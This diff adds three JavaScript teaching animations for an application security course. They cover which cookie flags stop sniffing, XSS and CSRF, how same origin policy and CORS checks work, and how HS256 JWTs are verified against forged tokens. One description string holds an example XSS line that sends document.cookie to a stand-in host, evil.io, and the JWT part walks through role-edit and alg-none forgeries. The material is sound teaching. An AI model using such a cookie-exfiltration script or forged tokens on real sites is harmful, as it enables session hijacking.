@@ -1117,3 +1117,181 @@
     }
   });
 })();
+
+/* =====================================================================================================
+   Application Security 1.1  A session cookie and three attacks: sniffing, XSS theft and cross site requests
+   ===================================================================================================== */
+(() => {
+  const { trace } = MLZ;
+  const { cbox, D } = CYZ;
+  const FL = { none: [], s: ['Secure'], sh: ['Secure', 'HttpOnly'], all: ['Secure', 'HttpOnly', 'SameSite=Lax'] };
+  const TH = {
+    sniff: ['Sniffing on café Wi-Fi', 'Secure', 'The victim opens one plain http:// link to the site. The attacker on the same Wi-Fi watches the traffic.'],
+    xss: ['XSS steals document.cookie', 'HttpOnly', 'An injected script on the page runs fetch("https://evil.io/?c=" + document.cookie).'],
+    csrf: ['Cross site request (CSRF)', 'SameSite=Lax', 'An evil page auto submits a hidden form: POST https://bank.example/transfer.']
+  };
+  trace('cycookie', {
+    title: 'Session cookies: which flag stops which attack',
+    sub: 'After login the server gives the browser a session cookie, and the browser sends it with every later request. Whoever holds the cookie is logged in. Three cookie flags each block a different way of abusing it.',
+    W: 600, H: 340,
+    params: [
+      { k: 'fl', label: 'Cookie flags', type: 'select', v: 'none', opts: [['none', 'none'], ['s', 'Secure'], ['sh', 'Secure; HttpOnly'], ['all', 'Secure; HttpOnly; SameSite=Lax']] },
+      { k: 'th', label: 'Attack', type: 'select', v: 'sniff', opts: [['sniff', 'Sniffing'], ['xss', 'XSS cookie theft'], ['csrf', 'Cross site request']] }
+    ],
+    tips: [
+      { t: 'Play sniffing with no flags. The cookie crosses the network in plain text and the attacker logs in as the victim.', play: true },
+      { t: 'Add Secure. The browser never sends the cookie over plain HTTP, so there is nothing to sniff.', set: { fl: 's' }, play: true },
+      { t: 'Keep Secure and choose XSS. Secure does not help, because the script runs inside the real HTTPS page.', set: { fl: 's', th: 'xss' }, play: true },
+      { t: 'Use all three flags against a cross site request. SameSite=Lax keeps the cookie off the forged POST.', set: { fl: 'all', th: 'csrf' }, play: true }
+    ],
+    frames(p) {
+      const flags = FL[p.fl], [tname, need, how] = TH[p.th], blocked = flags.includes(need);
+      const hdr = 'Set-Cookie: sid=8f3a91c2' + (flags.length ? '; ' + flags.join('; ') : '');
+      const fr = [
+        { st: 1, say: 'The user logs in: POST /login with a user name and password over HTTPS.' },
+        { st: 2, say: `The server checks the password, creates a random session id and replies with <code>${hdr}</code>.` },
+        { st: 3, say: 'Every later request to the site carries Cookie: sid=8f3a91c2. The server looks the id up and knows who you are. The cookie is as good as the password while it lasts.' },
+        { st: 4, say: `Attack: ${tname}. ${how}` },
+        { st: 5, done: true, blocked, say: blocked ? `Blocked by <b>${need}</b>. ${need === 'Secure' ? 'The browser refuses to put a Secure cookie on a plain HTTP request.' : need === 'HttpOnly' ? 'document.cookie does not show HttpOnly cookies, so the script gets nothing. The XSS itself is still a serious bug.' : 'With SameSite=Lax the browser sends the cookie on top level link clicks but not on cross site POSTs or background requests, so the forged transfer arrives logged out.'}` : `Not blocked. The attacker ${p.th === 'csrf' ? 'makes the victim’s own browser send the request with the cookie, so the bank sees a genuine logged in transfer' : 'now has sid=8f3a91c2 and can paste it into their own browser'}. The flag that stops this is <b>${need}</b>.` }
+      ];
+      return fr.map(x => ({ ...x, flags, tname, need, hdr, th: p.th }));
+    },
+    paint(z, f) {
+      const col = z.col, g = z.g;
+      cbox(z, 14, 20, 140, 60, ['Browser', 'victim'], { s: 13, b: true, fill: col.surf });
+      cbox(z, 446, 20, 140, 60, ['Server', 'bank.example'], { s: 13, b: true, fill: col.surf });
+      if (f.st >= 1) { D.arrow(g, 154, 36, 446, 36, col.ink2, 2); D.text(g, 'POST /login  user + password', 300, 30, { a: 'center', s: 11, c: col.ink2 }); }
+      if (f.st >= 2) { D.arrow(g, 446, 64, 154, 64, col.cv, 2); cbox(z, 160, 70, 280, 24, f.hdr, { s: 10, b: true, mono: true, fill: col.bg }); }
+      if (f.st >= 3) { D.arrow(g, 154, 112, 446, 112, col.ink2, 2); D.text(g, 'GET /account   Cookie: sid=8f3a91c2', 300, 106, { a: 'center', s: 11, mono: true, c: col.ink2 }); }
+      ['Secure', 'HttpOnly', 'SameSite=Lax'].forEach((t, i) => cbox(z, 14 + i * 120, 130, 112, 26, t, { s: 11, b: true, fill: f.flags.includes(t) ? col.cv : col.bg, c: f.flags.includes(t) ? '#fff' : col.ink2 }));
+      if (f.st >= 4) {
+        cbox(z, 200, 180, 200, 54, ['Attacker', f.tname], { s: 12, b: true, fill: 'rgba(225,29,72,0.15)' });
+        if (f.th === 'sniff') D.arrow(g, 300, 180, 300, 120, col.red, 2);
+        if (f.th === 'xss') D.arrow(g, 200, 200, 90, 80, col.red, 2);
+        if (f.th === 'csrf') { D.arrow(g, 260, 180, 90, 80, col.red, 2); D.arrow(g, 154, 78, 446, 160, col.orange, 2); }
+        cbox(z, 380, 130, 206, 26, `needs ${f.need}`, { s: 11, b: true, fill: col.surf });
+      }
+      if (f.st >= 5) cbox(z, 14, 250, 572, 40, f.blocked ? 'attacker gets nothing useful' : f.th === 'csrf' ? 'forged request arrives with the victim’s cookie' : 'attacker now holds sid=8f3a91c2', { s: 13, b: true, mono: false, fill: f.blocked ? 'rgba(15,118,110,0.2)' : 'rgba(225,29,72,0.2)' });
+      if (f.done) cbox(z, 14, 306, 572, 28, f.blocked ? `blocked by ${f.need}` : `session hijacked: add ${f.need}`, { s: 13, b: true, fill: f.blocked ? col.cv : col.red, c: '#fff' });
+    }
+  });
+})();
+
+/* =====================================================================================================
+   Application Security 1.1  The same origin policy: scheme, host and port, compared one by one
+   ===================================================================================================== */
+(() => {
+  const { trace } = MLZ;
+  const { cbox, D } = CYZ;
+  const PAGE = ['https', 'shop.example.com', '443'];
+  const URLS = {
+    a: ['https://shop.example.com/account', ['https', 'shop.example.com', '443']],
+    b: ['http://shop.example.com/cart', ['http', 'shop.example.com', '80']],
+    c: ['https://api.example.com/cart', ['https', 'api.example.com', '443']],
+    d: ['https://shop.example.com:8443/', ['https', 'shop.example.com', '8443']],
+    e: ['https://shop.example.com.evil.io/', ['https', 'shop.example.com.evil.io', '443']]
+  };
+  trace('cysop', {
+    title: 'Same origin policy: can this page read that response?',
+    sub: 'A script on one origin may send requests anywhere, but may only read responses from its own origin. The origin is the triple scheme, host and port, and all three must match exactly. CORS is how a server opts in to sharing with other origins.',
+    W: 600, H: 340,
+    params: [
+      { k: 'u', label: 'Script on https://shop.example.com fetches', type: 'select', v: 'c', opts: Object.entries(URLS).map(([k, v]) => [k, v[0]]) },
+      { k: 'cors', label: 'Server reply header', type: 'select', v: 'no', opts: [['no', 'no CORS header'], ['yes', 'Access-Control-Allow-Origin: https://shop.example.com']] }
+    ],
+    tips: [
+      { t: 'Play the api subdomain. One different label in the host is enough to make it another origin.', play: true },
+      { t: 'Turn on the CORS header. The API server now tells the browser it is happy to share with the shop.', set: { cors: 'yes' }, play: true },
+      { t: 'Try the look alike host. It starts with shop.example.com but is a completely different site.', set: { u: 'e', cors: 'no' }, play: true }
+    ],
+    frames(p) {
+      const [url, o] = URLS[p.u], same = o.every((v, i) => v === PAGE[i]);
+      const names = ['scheme', 'host', 'port'], fr = [];
+      fr.push({ st: 0, n: 0, say: `The page is https://shop.example.com, so its origin is (https, shop.example.com, 443). A script on it calls fetch("${url}").` });
+      names.forEach((nm, i) => fr.push({ st: 1, n: i + 1, say: `${nm}: page ${PAGE[i]}, target ${o[i]}. ${o[i] === PAGE[i] ? 'Match.' : '<b>Different.</b>'}${i === 2 && p.u === 'b' ? ' The port differs too, because http defaults to 80 and https to 443.' : ''}` }));
+      const ok = same || p.cors === 'yes';
+      fr.push({ st: 2, done: true, n: 3, same, ok, say: same ? 'Same origin: the script can read the response. Cookies for the site go along as normal.' : ok ? 'Different origin, but the response carries Access-Control-Allow-Origin naming the shop, so the browser lets the script read it. A server should list exact origins and never reflect any Origin it is sent while also allowing credentials.' : 'Different origin and no CORS permission. The request may still reach the server, but the browser hides the response from the script. This is what stops evil.io from reading your webmail through your logged in browser.' });
+      return fr.map(x => ({ ...x, url, o }));
+    },
+    paint(z, f) {
+      const col = z.col, g = z.g, names = ['scheme', 'host', 'port'], X = [120, 230, 470], Wd = [100, 230, 100];
+      D.text(g, 'page', 60, 62, { a: 'center', s: 12, b: true, c: col.ink2 }); D.text(g, 'target', 60, 112, { a: 'center', s: 12, b: true, c: col.ink2 });
+      names.forEach((nm, i) => {
+        D.text(g, nm, X[i] + Wd[i] / 2, 34, { a: 'center', s: 11, b: true, c: col.ink2 });
+        cbox(z, X[i], 44, Wd[i], 32, PAGE[i], { s: 12, b: true, mono: true, fill: col.surf });
+        if (f.n > i) { const m = f.o[i] === PAGE[i]; cbox(z, X[i], 94, Wd[i], 32, f.o[i], { s: 12, b: true, mono: true, fill: m ? 'rgba(15,118,110,0.2)' : 'rgba(225,29,72,0.2)' }); D.text(g, m ? '=' : '≠', X[i] + Wd[i] / 2, 90, { a: 'center', s: 14, b: true, c: m ? col.cv : col.red }); }
+      });
+      cbox(z, 14, 150, 572, 30, `fetch("${f.url}")`, { s: 12, b: true, mono: true, fill: col.bg });
+      if (f.done) {
+        cbox(z, 14, 200, 572, 60, f.same ? ['same origin', 'response readable'] : f.ok ? ['cross origin, allowed by CORS', 'response readable'] : ['cross origin, no CORS', 'request may be sent, response hidden from the script'], { s: 13, b: true, fill: f.ok ? 'rgba(15,118,110,0.2)' : 'rgba(225,29,72,0.15)' });
+        cbox(z, 14, 306, 572, 28, f.ok ? 'script can read the response' : 'blocked by the same origin policy', { s: 13, b: true, fill: f.ok ? col.cv : col.red, c: '#fff' });
+      }
+    }
+  });
+})();
+
+/* =====================================================================================================
+   Application Security 1.1  A JWT signed with HS256, verified step by step, and three forgery attempts
+   ===================================================================================================== */
+(() => {
+  const { trace } = MLZ;
+  const { cbox, D, sha256, utf8 } = CYZ;
+  const hmac = (key, msg) => {
+    let k = key.length > 64 ? sha256(key) : key.slice();
+    while (k.length < 64) k.push(0);
+    return sha256(k.map(b => b ^ 0x5c).concat(sha256(k.map(b => b ^ 0x36).concat(msg))));
+  };
+  const A = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_';
+  const b64u = bytes => { let s = ''; for (let i = 0; i < bytes.length; i += 3) { const n = (bytes[i] << 16) | ((bytes[i + 1] || 0) << 8) | (bytes[i + 2] || 0), m = Math.min(3, bytes.length - i) + 1; for (let j = 0; j < m; j++) s += A[(n >> (18 - 6 * j)) & 63]; } return s; };
+  const KEY = utf8('server-secret-key-32-bytes-long!'), NOW = 1700000000;
+  const enc = o => b64u(utf8(JSON.stringify(o)));
+  const H = enc({ alg: 'HS256', typ: 'JWT' }), P = enc({ sub: 'alice', role: 'user', exp: NOW + 900 });
+  const SIG = b64u(hmac(KEY, utf8(H + '.' + P)));
+  trace('cyjwt', {
+    title: 'JSON Web Tokens: signed, not secret',
+    sub: 'A JWT is three base64url parts joined by dots: header, payload and signature. The server signs header.payload with HMAC-SHA-256 and a secret key. Anyone can read the payload, but nobody without the key can change it unnoticed.',
+    W: 600, H: 340,
+    params: [
+      { k: 'atk', label: 'Token presented', type: 'select', v: 'role', opts: [['ok', 'the genuine token'], ['role', 'payload edited to role admin'], ['none', 'header alg none, no signature'], ['exp', 'genuine token, 16 minutes later']] }
+    ],
+    tips: [
+      { t: 'Play the edited payload. Changing role to admin changes the bytes that were signed, so the signature no longer matches.', play: true },
+      { t: 'Try alg none. Old libraries trusted the header’s choice of algorithm and skipped the check. The server must fix the algorithm itself.', set: { atk: 'none' }, play: true },
+      { t: 'Present the genuine token later. A valid signature does not help once exp has passed.', set: { atk: 'exp' }, play: true }
+    ],
+    frames(p) {
+      const a = p.atk;
+      const hdr = a === 'none' ? enc({ alg: 'none', typ: 'JWT' }) : H;
+      const pay = a === 'role' || a === 'none' ? enc({ sub: 'alice', role: 'admin', exp: NOW + 900 }) : P;
+      const sig = a === 'none' ? '' : SIG;
+      const good = b64u(hmac(KEY, utf8(hdr + '.' + pay)));
+      const now = a === 'exp' ? NOW + 960 : NOW;
+      const step2 = a === 'none' ? 'fail' : 'ok', step3 = a === 'none' ? 'skip' : good === sig ? 'ok' : 'fail', step4 = step3 !== 'ok' ? 'skip' : now > NOW + 900 ? 'fail' : 'ok';
+      const valid = step2 === 'ok' && step3 === 'ok' && step4 === 'ok';
+      const fr = [
+        { st: 1, say: `The server issued a token for alice with role user, valid for 15 minutes. Header ${H.slice(0, 20)}..., payload ${P.slice(0, 20)}..., signature ${SIG.slice(0, 16)}...` },
+        { st: 2, say: `The client presents a token. ${a === 'ok' ? 'It is the genuine one.' : a === 'role' ? 'The attacker decoded the payload, changed "user" to "admin" and encoded it again. Easy, since base64url is not encryption.' : a === 'none' ? 'The attacker set the header to {"alg":"none"}, changed the role and dropped the signature.' : 'It is the genuine token, but 16 minutes have passed.'}` },
+        { st: 3, c2: step2, say: step2 === 'ok' ? 'Check 1: the header says HS256, the only algorithm this server accepts.' : 'Check 1: the header says alg none. The server accepts only HS256, so it rejects the token here. Libraries before 2015 often skipped verification for none.' },
+        { st: 4, c2: step2, c3: step3, say: step3 === 'skip' ? 'Check 2 is not reached.' : `Check 2: recompute HMAC-SHA-256(key, header.payload) = ${good.slice(0, 16)}... and compare in constant time with the token’s ${sig.slice(0, 16)}... ${step3 === 'ok' ? 'They match.' : '<b>They differ</b>: the payload was changed.'}` },
+        { st: 5, c2: step2, c3: step3, c4: step4, say: step4 === 'skip' ? 'Check 3 is not reached.' : `Check 3: exp is ${NOW + 900}, now is ${now}. ${step4 === 'ok' ? 'Still valid.' : '<b>Expired.</b>'}` },
+        { st: 6, done: true, c2: step2, c3: step3, c4: step4, valid, say: valid ? 'Accepted: the server trusts sub alice and role user without a database lookup. That is the appeal of JWTs, and also the catch: a stolen token works until it expires, so keep lifetimes short.' : 'Rejected. Never put secrets in a JWT payload, always fix the algorithm on the server, use a long random key (at least 256 bits for HS256), and check exp, iss and aud.' }
+      ];
+      return fr.map(x => ({ ...x, hdr, pay, sig, a }));
+    },
+    paint(z, f) {
+      const col = z.col, g = z.g;
+      if (f.st >= 1) { cbox(z, 14, 14, 186, 44, ['header', '{"alg":"HS256"}'], { s: 11, b: true, mono: true, fill: 'rgba(225,29,72,0.12)' }); cbox(z, 207, 14, 186, 44, ['payload', '{"sub":"alice","role":"user"}'], { s: 11, b: true, mono: true, fill: 'rgba(124,58,237,0.12)' }); cbox(z, 400, 14, 186, 44, ['signature', SIG.slice(0, 18) + '…'], { s: 11, b: true, mono: true, fill: 'rgba(15,118,110,0.15)' }); }
+      if (f.st >= 2) {
+        const ed = f.a === 'role' || f.a === 'none';
+        cbox(z, 14, 72, 186, 44, ['presented header', f.a === 'none' ? '{"alg":"none"}' : '{"alg":"HS256"}'], { s: 11, b: true, mono: true, fill: f.a === 'none' ? col.red : col.surf, c: f.a === 'none' ? '#fff' : col.ink });
+        cbox(z, 207, 72, 186, 44, ['presented payload', ed ? '{..."role":"admin"}' : '{..."role":"user"}'], { s: 11, b: true, mono: true, fill: ed ? col.red : col.surf, c: ed ? '#fff' : col.ink });
+        cbox(z, 400, 72, 186, 44, ['presented signature', f.sig ? f.sig.slice(0, 18) + '…' : '(empty)'], { s: 11, b: true, mono: true, fill: col.surf });
+      }
+      const chk = (y, label, v) => { if (!v) return; cbox(z, 14, y, 420, 34, label, { s: 12, b: true, fill: col.surf }); cbox(z, 444, y, 142, 34, v === 'ok' ? 'pass' : v === 'fail' ? 'FAIL' : 'not reached', { s: 13, b: true, fill: v === 'ok' ? col.cv : v === 'fail' ? col.red : col.bg, c: v === 'skip' ? col.ink2 : '#fff' }); };
+      chk(134, '1. algorithm is the one the server expects (HS256)', f.c2);
+      chk(176, '2. HMAC-SHA-256(key, header.payload) equals signature', f.c3);
+      chk(218, '3. exp is in the future', f.c4);
+      if (f.done) cbox(z, 14, 306, 572, 28, f.valid ? 'token accepted' : 'token rejected', { s: 13, b: true, fill: f.valid ? col.cv : col.red, c: '#fff' });
+    }
+  });
+})();
